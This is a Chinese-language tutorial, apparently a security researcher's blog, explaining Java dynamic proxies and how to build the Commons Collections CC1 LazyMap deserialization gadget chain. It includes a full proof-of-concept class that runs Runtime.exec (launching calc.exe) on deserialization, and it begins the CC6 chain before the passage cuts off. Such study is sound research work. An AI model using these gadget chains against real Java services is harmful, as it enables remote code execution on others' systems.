<span class="hljs-title class_">IUserDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>目标对象：UserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;保存数据&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>动态代理对象：UserProxyFactory</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> &#123;<br><br>    <span class="hljs-keyword">private</span> Object target;<span class="hljs-comment">// 维护一个目标对象</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">// 为目标对象生成代理对象</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;<br><br>                    <span class="hljs-meta">@Override</span><span class="hljs-comment">//这后面用于定义代理对象的行为，在目标对象的方法被调用时执行</span><br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                        System.out.println(<span class="hljs-string">&quot;开启事务&quot;</span>);<br><br>                        <span class="hljs-comment">// 执行目标对象方法</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br><br>                        System.out.println(<span class="hljs-string">&quot;提交事务&quot;</span>);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                    &#125;<br>                &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>测试类：TestProxy</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestProxy</span> &#123;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDynamicProxy</span> <span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDao</span>();<br>        System.out.println(target.getClass());  <span class="hljs-comment">//输出目标对象信息</span><br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IUserDao) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br>        System.out.println(proxy.getClass());  <span class="hljs-comment">//输出代理对象信息</span><br>        proxy.save();  <span class="hljs-comment">//执行代理方法</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>输出结果</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">class com.proxy.UserDao<br>class com.sun.proxy.<span class="hljs-variable">$Proxy4</span><br>开启事务<br>保存数据<br>提交事务<br></code></pre></td></tr></table></figure><h4 id="再来看看源代码"><a href="#再来看看源代码" class="headerlink" title="再来看看源代码"></a>再来看看源代码</h4><p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 <code>__call</code> ，我们需要用到 <code>java.reflect.Proxy</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br><span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code> 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。</p><p>比如，我们写这样一个类<code>ExampleInvocationHandler</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span>&#123;<br>        <span class="hljs-built_in">this</span>.map=map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//这个是重写InvocationHandler的时候出现的，用来决定代理需要的</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span> (method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hook method &quot;</span>+method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hacked Object&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.map,args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ExampleInvocationHandler</code>类实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。</p><p>调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleInvocationHandler</span>(<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">HashMap</span>());<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)<br>                Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;,<br>                        handler);<br>        proxyMap.put(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) proxyMap.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行App，我们可以发现，虽然我向Map放入的hello值为world，但我们获取到的结果却是 HackedObject ：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224015.png" alt="image-20230129150405833"> </p><p>我们回看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，会发现实际上这个类实际就是一个<code>InvocationHandler</code>，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 <code>AnnotationInvocationHandler#invoke</code> 方法中，进而触发我们的<code>LazyMap#get</code> 。</p><h3 id="使用LazyMap构造利用链"><a href="#使用LazyMap构造利用链" class="headerlink" title="使用LazyMap构造利用链"></a>使用LazyMap构造利用链</h3><p>所以，在上一章TransformedMap POC的基础上进行修改，首先使用LazyMap替换TransformedMap</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Map</span> outerMap = LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>然后再对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个对象进行Proxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><blockquote><p>这里的newInstance的意思是这样的</p><ul><li><p>创建类的对象：调用Class对象的newInstance()方法</p><ul><li>类必须有一个无参数的构造器。</li><li>类的构造器的访问权限需要足够</li></ul></li><li><p>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作</p></li><li><p>步骤如下</p><ul><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ul></li></ul><p><strong>下面是一些示例：</strong></p><p>对于不带参数的public类型的Class，我们可以直接对其创建实例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">String s = String.<span class="hljs-keyword">class</span>.<span class="hljs-title function_ invoke__">newInstance</span>();<br></code></pre></td></tr></table></figure><p>但对于带参数的Class，需要调用其带任意参数的构造方法，必须借助于Constructor对象</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Constructor cons1 = Child.<span class="hljs-keyword">class</span>.getConstructor(String.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>Child kid = (Child) cons1.newInstance(<span class="hljs-string">&quot;testName&quot;</span>,<span class="hljs-number">60</span>);<br>System.<span class="hljs-keyword">out</span>.println(kid.name);<br></code></pre></td></tr></table></figure><ol><li>首先获取该对象的构造方法</li><li>对该构造方法调用newInstance并传入特定参数，创建实例成功</li><li>Constructor有getConstructor(Class)、getDeclaredConstructor(Class)、getConstructors()、getDeclaredConstructors()，使用方法类似，不再赘述</li></ol></blockquote><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> ，所以我们还需要再用<code>AnnotationInvocationHandler</code>对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">handler = (InvocationHandler) construct.newInstance(Retention.class,<br>proxyMap);<span class="hljs-comment">//使用Java的反射机制创建一个新的实例对象</span><br></code></pre></td></tr></table></figure><blockquote><p>为什么可以强转(InvocationHandler) </p><p><code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，所以该对象可以强制转换为 <code>InvocationHandler</code> 类型，以便作为参数传递给后面的代码。</p></blockquote><p>修改完后的完整的代码如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br>        handler=(InvocationHandler) construct.newInstance(Retention.class,proxyMap);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224605.png" alt="image-20230201202800276"> </p><p>成功弹出计算器</p><p>但是有一个缺点是LazyMap和TransformedMap一样都不能解决高版本利用的问题，接下来就来解决这个问题</p><h2 id="解决高版本的利用问题-CC6"><a href="#解决高版本的利用问题-CC6" class="headerlink" title="解决高版本的利用问题(CC6)"></a>解决高版本的利用问题(CC6)</h2><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化，所以高版本的并不能够利用</p><p>以下是p神简化的CC1利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment"> java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.hash()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment"> java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment"> java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>我们需要看的主要是从最开始到 <code>org.apache.commons.collections.map.LazyMap.get()</code> 的那⼀部分，因为 <code>LazyMap#get</code> 后⾯的部分在上⼀篇⽂章⾥已经说了。所以简单来说，解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤ <code>LazyMap#get()</code> 的地⽅ </p><blockquote><p>关于这里为什么要找get()的原因</p><p>LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p></blockquote><p>我们找到的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>,在其<code>getValue</code>⽅法中调⽤了 <code>this.map.get</code> ，⽽其<code>hashCode</code>⽅法调⽤了<code>getValue</code>⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.commons.collections.keyvalue;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.KeyValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br><span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><br><span class="hljs-comment">//...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>所以需要去找到哪里调用了<code>TiedMapEntry#hashCode</code></p><p>ysoserial中，是利⽤ <code>java.util.HashSet#readObject</code> 到 <code>HashMap#put()</code> 到 <code>HashMap#hash(key)</code>最后到 <code>TiedMapEntry#hashCode()</code> 。</p><p>实际上我发现，在 <code>java.util.HashMap#readObject</code> 中就可以找到 <code>HashMap#hash()</code> 的调⽤，去掉了最前⾯的两次调⽤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>        <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) 